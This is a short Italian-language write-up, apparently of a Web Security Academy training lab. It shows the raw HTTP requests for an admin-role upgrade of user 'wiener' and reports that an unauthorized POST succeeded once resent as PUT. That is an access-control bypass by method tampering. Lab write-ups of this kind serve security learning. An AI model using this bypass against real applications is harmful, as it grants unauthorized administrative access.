la richiesta che ha upgradato `wiener` ad utente admin è questa:

```http
POST /admin-roles HTTP/2
Host: 0ae300fb03a213d08011d0df00aa0020.web-security-academy.net
Cookie: session=oS3v9gT82bjREkpOGzVZtVUW2NDFhaur
Content-Length: 30
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="127", "Not)A;Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: it-IT
Upgrade-Insecure-Requests: 1
Origin: https://0ae300fb03a213d08011d0df00aa0020.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ae300fb03a213d08011d0df00aa0020.web-security-academy.net/admin
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

username=wiener&action=upgrade
```

mentre ero loggato come `wiener`, facendo la stessa post, ho ottenuto "unauthorized"

```bash
POST /admin-roles HTTP/2
Host: 0ae300fb03a213d08011d0df00aa0020.web-security-academy.net
Cookie: session=Njp8JdDF6DATJ56FCii3RLaB9TFQk9oY
..
...
..
username=wiener&action=upgrade
```

(ovviamente il cookie è diverso)

risposta:

```bash
HTTP/2 401 Unauthorized
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 14

"Unauthorized"
```

è bastato rifare la stessa richiesta con PUT e ha funzionato



